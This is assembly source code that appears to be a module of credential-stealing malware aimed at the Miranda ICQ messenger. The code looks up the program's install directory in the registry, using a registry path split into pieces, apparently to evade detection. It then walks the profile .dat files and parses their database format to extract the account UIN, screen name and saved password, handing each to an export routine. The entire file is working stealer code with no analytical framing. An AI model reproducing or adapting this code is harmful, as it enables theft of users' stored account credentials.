; Miranda-icq
; Tested on:
;	Miranda 0.3.4 alpha

.const

MIRANDA_HDR struct DWORD
	Signature             	BYTE 16 dup(?)
	Version               	DWORD ?
	ofsFileEnd            	DWORD ?
	slackSpace            	DWORD ?
	contactCount          	DWORD ?
	ofsFirstContact       	DWORD ?
	ofsUser               	DWORD ?
	ofsFirstModuleName    	DWORD ?
MIRANDA_HDR ends

MIRANDA_CONTACT struct DWORD
	Signature             	DWORD ?
	ofsNext               	DWORD ?
	ofsFirstSettings      	DWORD ?
	eventCount            	DWORD ?
	ofsFirstEvent         	DWORD ?
	ofsLastEvent          	DWORD ?
	ofsFirstUnreadEvent   	DWORD ?
	timestampFirstUnread	DWORD ?
MIRANDA_CONTACT ends

MIRANDA_CSETTINGS struct DWORD
	Signature		DWORD ?
	ofsNext         	DWORD ?
	ofsModuleName   	DWORD ?
	cbBlob          	DWORD ?
MIRANDA_CSETTINGS ends

DB_MIRANDA_V121                 equ 00000700h ; Miranda 1.2.0, 1.2.1, 0.3.x
DBCONTACT_SIGNATURE             equ 43DECADEh ; Signature (to check db for consistency)
DBCONTACTSETTINGS_SIGNATURE     equ 53DECADEh ; Signature

DBVT_DELETED equ 0      ; this setting just got deleted, no other values are valid
DBVT_BYTE    equ 1      ; bVal and cVal are valid
DBVT_WORD    equ 2      ; wVal and sVal are valid
DBVT_DWORD   equ 4      ; dVal and lVal are valid
DBVT_ASCIIZ  equ 255    ; pszVal is valid
DBVT_BLOB    equ 254    ; cpbVal and pbVal are valid

.data
		DBHEADER_SIGNATURE	db 	"Miranda ICQ DB",0,1ah
		@AllocStr <InstDir>,	<"Install_Dir">
		@AllocStr <szMirandaSN>,	<"SN">
		@AllocStr <szMirandaPass>,	<"Password">
		@AllocMem <lpMirandaCommonBuf>, <MAX_PATH+1>
		@AllocStr <PeecTP1>, 	<"SOFTW">
		@AllocStr <PeecTP2>, 	<"ARE\Miranda">
		@AllocMem <lpMirandaPropBuf>,	<256>

.code

GetMirandaPass proc uses esi edi ebx
	LOCAL	hMap: MappedFile
	LOCAL	lpPar: DWORD
	
	invoke	MapFile, offset lpMirandaCommonBuf, addr hMap
	.IF	(eax) && (hMap.dwFileSize > 32)
		mov	esi, hMap.lpMem
		mov	ebx, esi
		
		invoke	CompareMem, esi, offset DBHEADER_SIGNATURE, 16
		test	eax, eax
		jz	@err
		
		cmp	[esi][MIRANDA_HDR.Version], DB_MIRANDA_V121
		jnz	@err
		
		; Goto user's info header
		add	esi, [esi][MIRANDA_HDR.ofsUser]
		cmp	[esi][MIRANDA_CONTACT.Signature], DBCONTACT_SIGNATURE
		jnz	@err
		
		
		; Goto user's setting entry
		mov	esi, [esi][MIRANDA_CONTACT.ofsFirstSettings]
		add	esi, ebx 
		
	@loop:
		mov	lpPar, esi
		; Read parameter chains
		cmp	[esi][MIRANDA_CSETTINGS.Signature], DBCONTACTSETTINGS_SIGNATURE
		jnz	@err
		add	esi, sizeof MIRANDA_CSETTINGS
		
		; Read parameters
	@param_loop:
		; Read param name
		mov	edi, offset lpMirandaPropBuf
		xor	eax, eax		
		lodsb
		xchg	ecx, eax
		rep movsb
		
		; NULL terminate the name buffer
		xor	eax, eax
		stosb
		
		; Check for last param
		cmp	byte ptr[lpMirandaPropBuf], 0
		jz	@loop_end
		
		; Get data type
		lodsb
		
		.IF	(al == DBVT_BYTE) || (al == DBVT_WORD)
			; Byte/Word
			add	esi, eax
		.ELSEIF (al == DBVT_DWORD)
			; DWORD
			cmp	dword ptr[lpMirandaPropBuf], 'NIU'
			.IF	ZERO?
				invoke	ExportData, TYPE_MIRANDA_UIN, 0, esi, eax
			.ENDIF
			add	esi, 4
		.ELSEIF (al == DBVT_ASCIIZ)
			; String (excludes null terminator)
			invoke	lstrcmp, offset szMirandaSN, offset lpMirandaPropBuf
			.IF	!eax
				lodsw
				.IF	eax
					push	eax
					invoke	ExportData, TYPE_MIRANDA_SN, 0, esi, eax
					pop	eax
					add	esi, eax
				.ENDIF
			.ELSE		
				invoke	lstrcmp, offset szMirandaPass, offset lpMirandaPropBuf
				.IF	!eax
					lodsw
					.IF	eax
						push	eax
						invoke	ExportData, TYPE_MIRANDA_PASS, 0, esi, eax
						pop	eax
						add	esi, eax
					.ENDIF
				.ELSE
					xor	eax, eax
					lodsw
					add	esi, eax
				.ENDIF
			.ENDIF
		.ELSEIF (al == DBVT_BLOB)
			; Blob
			lodsw
			add	esi, eax
		.ELSE
			; Error?
			jmp	@loop_end
		.ENDIF
		jmp	@param_loop
		
	@loop_end:
		mov	esi, lpPar
		cmp	[esi][MIRANDA_CONTACT.ofsNext], 0
		jz	@err
		; Next param chain
		mov	esi, [esi][MIRANDA_CONTACT.ofsNext]
		add	esi, ebx 
		jmp	@loop
	.ENDIF

	
@err:	
	invoke	UnmapFile, addr hMap 
	ret
GetMirandaPass endp

; Scan directory for .dat files
GetMirandaDats proc uses edi
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD
	
	invoke	lstrlen, offset lpMirandaCommonBuf
	lea	edi, [eax+offset lpMirandaCommonBuf+1]        
        invoke	lstrcat, offset lpMirandaCommonBuf, offset szICQ99bSearch
        	
	invoke  FindFirstFile, offset lpMirandaCommonBuf, addr FindFileData
	mov     hFind, eax
	inc     eax
	jz      @ret	
        
@find_loop:                
        cmp	FindFileData.cFileName[0], '.'
        jz	@level_up_skip
        
        invoke	lstrcpy, edi, addr FindFileData.cFileName
        
        ; Read password
        invoke	GetMirandaPass
        
@level_up_skip:
	invoke  FindNextFile, hFind, addr FindFileData
	test    eax, eax
	jnz	@find_loop

	invoke  FindClose, hFind

@ret:
	ret
GetMirandaDats endp

GetMirandaOutput proc
	LOCAL   dwBufSize: DWORD

	; Write header	
	invoke	ExportModule, MODULE_MIRANDA
	
	; Query the miranda work dir
	mov	dwBufSize, MAX_PATH
	invoke lstrcat, offset PeecTP1, offset PeecTP2
	invoke	RegReadValue, HKEY_LOCAL_MACHINE, offset PeecTP1, offset InstDir, offset lpMirandaCommonBuf, addr dwBufSize 
	.IF	eax
		; Scan dir for dat files
		invoke	GetMirandaDats
	.ENDIF
	
	ret
GetMirandaOutput endp